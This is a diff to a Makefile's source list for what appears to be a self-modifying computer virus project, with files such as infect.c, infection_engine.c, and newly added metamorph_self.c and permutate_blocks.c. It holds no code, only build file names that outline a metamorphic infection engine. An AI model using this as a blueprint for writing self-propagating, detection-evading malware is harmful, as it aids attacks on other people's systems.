@@ -25,6 +25,7 @@ SRC =	loader.s                       \
 	virus/adjust_references.c      \
 	virus/copy_virus_to_clone.c    \
 	virus/copy_client_to_clone.c   \
+	virus/disasm_block.c           \
 	virus/disasm_jumps.c           \
 	virus/disasm_length.c          \
 	virus/disasm_operands.c        \
@@ -35,13 +36,15 @@ SRC =	loader.s                       \
 	virus/infect.c                 \
 	virus/infection_engine.c       \
 	virus/log.c                    \
+	virus/metamorph_self.c         \
+	virus/permutate_blocks.c       \
 	virus/permutate_instructions.c \
 	virus/permutate_registers.c    \
 	virus/random.c                 \
 	virus/setup_virus_header.c     \
 	virus/syscall.c                \
-	virus/write_jump.c             \
 	virus/utils.c                  \
+	virus/write_jump.c             \
 	start.c
 
 CC = clang
